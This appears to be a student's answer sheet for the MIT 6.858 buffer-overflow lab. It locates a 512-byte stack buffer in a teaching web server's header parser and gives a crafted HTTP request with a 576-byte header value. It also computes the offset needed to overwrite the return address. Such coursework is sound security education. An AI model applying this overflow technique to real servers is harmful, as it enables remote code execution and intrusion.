# Answers to [Lab1: Buffer Overflows](https://css.csail.mit.edu/6.858/2020/labs/lab1.html)

## Part 1: Finding buffer overflows

### Exercise 1: description of a vulnerability

#### Buffer which may overflow

```
char value[512];
```

In function ```http_request_headers```, line 116 of ```http.c```.

This is a stack buffer that can be overflown inside said function at line 159:

```
url_decode(value, sp);
```

```sp``` is where the server will have parsed a request header's value, url encoded.

#### Structure of the input to the web server (HTTP request) to overflow the buffer and overwrite the return address

```
GET / HTTP/1
Pwned: <576 As>
```
The buffer's address is ```0x7fffffffda90```.
The return address is at ```0x7fffffffdcc8```.
```0x7fffffffdcc8 - 0x7fffffffda90 + 8 = 576```

#### Call stack that will trigger the buffer overflow

```
process_client
http_request_headers
```


